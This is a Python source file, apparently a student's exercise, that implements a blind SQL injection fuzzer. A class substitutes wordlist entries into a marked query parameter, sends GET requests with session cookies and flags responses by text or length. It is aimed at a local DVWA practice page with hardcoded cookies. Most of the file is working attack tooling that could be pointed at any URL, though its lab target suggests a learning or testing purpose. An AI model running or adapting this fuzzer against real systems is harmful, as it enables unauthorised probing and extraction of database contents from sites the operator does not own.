import requests
import getopt
import sys
import time
from collections import deque

def usage():
    pass

class ItemChangeNotDefined(Exception):
    def __init__(self) -> None:
        super().__init__("Item a ser mudado não foi defino!")

class SlqInjectionAttack():
    
    @property
    def url(self):
        return self._url
    
    @url.setter
    def url(self,url):
        self._url = url
    
    @property
    def key_to_change(self):
        return self._key_to_change
        
    @key_to_change.setter
    def key_to_change(self,key):
        self._key_to_change = key
    
    @property
    def querys(self):
        return self._querys
    
    @querys.setter
    def querys(self,querys):
        items_querys = querys.split("&")
        self._key_to_change = None
        for key,item in [ i.split("=") for i in items_querys]:
            if item == "^INJECT":
                self.key_to_change = key
                item = ""
        if self.key_to_change is not None:
            self._querys = self.string_to_dict(querys,"&")
        else:
            raise ItemChangeNotDefined()
    
    @property
    def wordlist(self):
        try:
            return self._wordlist
        except:
            return None
    
    @wordlist.setter
    def wordlist(self,wordlist):
        self._wordlist = deque()
        with open(wordlist,"r") as file:
            for word in file:
                self._wordlist.append(word.strip())
      
    @property
    def cookies(self):
        return self._cookies
    
    @cookies.setter
    def cookies(self,cookies):
        if cookies == None:
            self._cookies = {}
        else:
            self._cookies = self.string_to_dict(cookies,";")

    def string_to_dict(self,string,separator):
        dict = {}
        itens_string = string.split(separator)
        
        dict.update({key.strip():item.strip() for key,item in [ i.split("=") for i in itens_string]})
            
        return dict            
    
    def __init__(self,url,wordlist,cookies=None):
        try:
            self.url,self.querys = url.split('?')
            self.wordlist = wordlist.strip()
            self.cookies = cookies.strip()
            self.validator = None
        except ItemChangeNotDefined as e:
            print(e)
        except Exception as e:
            print(e)
    
    def change_item(self):
        self.querys.update({self.key_to_change:self.wordlist.pop().strip()})
    
    def send_get_request(self):
        url_send = self.url + "?" 
        for key in self.querys:
            url_send += f"{key}={self.querys.get(key)}&"
        url_send = url_send[:-1]
        response = requests.get(url = url_send,cookies=self.cookies,timeout=10)
        return response
    
    def is_string_valid(self,response):
        if self.validator not in response._content.decode():
            return True
        
        return False
    
    def is_legth_valid(self,response):
        if len(response._content) != self.validator:
            return True
        
        return False
        
    def start_attack(self,function_validator):
        while len(self.wordlist) > 0:  
            self.change_item()
            print("Inicio:", time.localtime())
            response = self.send_get_request()
            print("Fim:", time.localtime())
            if function_validator(response): print(response.url)
            
ataque = SlqInjectionAttack("http://localhost/dvwa/vulnerabilities/sqli_blind/?id=^INJECT&Submit=Submit#","teste.txt",cookies="security=low; PHPSESSID=86e8aq88qa4gbfl43d4hhi2lns")
print(len(requests.get("http://localhost/dvwa/vulnerabilities/sqli_blind/?id=^INJECT&Submit=Submit#",cookies=ataque.cookies,timeout=10)._content))
ataque.validator = "User ID exists in the database."
ataque.start_attack(ataque.is_string_valid)

# if __name__ == "__main__":
#     try:
#         options, _ = getopt.getopt(sys[1:],['',])
#         if len(options) == 0:
#             raise getopt.GetoptError('Argumento inválido')
        
#         for command, argument in options:
#             pass
        
#     except getopt.GetoptError as e:
#         print(e)
#     except ItemChangeNotDefined as e:
#         print(e)
#     except Exception as e:
#         print(e)